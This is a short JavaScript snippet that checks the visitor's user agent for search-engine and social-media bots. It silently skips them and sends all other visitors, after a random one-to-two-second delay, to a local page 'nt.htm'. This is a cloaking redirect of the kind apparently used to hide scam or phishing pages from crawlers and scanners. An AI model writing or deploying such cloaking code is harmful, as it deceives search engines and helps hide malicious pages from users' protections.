(function () {
  function isBotUserAgent() {
    const bots = [
      /bot/i, /crawler/i, /spider/i, /crawling/i,
      /google/i, /bing/i, /yahoo/i, /facebook/i,
      /duckduckgo/i, /baidu/i, /yandex/i
    ];
    return bots.some(bot => bot.test(navigator.userAgent));
  }

  function redirectUser() {
    const delay = Math.floor(Math.random() * 1000) + 1000; // 1-2 seconds delay
    setTimeout(() => {
      window.location.href = "nt.htm"; // Redirect to local HTML file
    }, delay);
  }

  window.addEventListener("load", () => {
    if (isBotUserAgent()) {
      console.log("Bot detected, exiting...");
      return;
    }

    redirectUser();
  });
})();
